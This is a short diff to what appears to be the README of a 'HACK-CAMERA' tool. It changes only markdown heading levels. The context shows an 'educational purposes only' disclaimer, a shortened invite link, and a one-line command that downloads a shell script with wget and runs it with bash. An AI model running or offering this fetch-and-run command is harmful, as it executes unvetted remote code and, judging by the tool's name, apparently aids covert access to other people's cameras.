@@ -11,11 +11,12 @@ Note : Tool is Made of Educational Purposes only.
        Please try not to harm anyone device 
        it's For Fun Purpose Not For Revenge
        (Join Us All https://bit.ly/3LAy80f)
-### One Line Command
+       
+###### One Line Command
 ```bash
 wget https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/hack_camera.sh && bash hack_camera.sh
 ```
-###Installation
+###### Installation
 ```bash
 apt update && apt upgrade -y
 ```
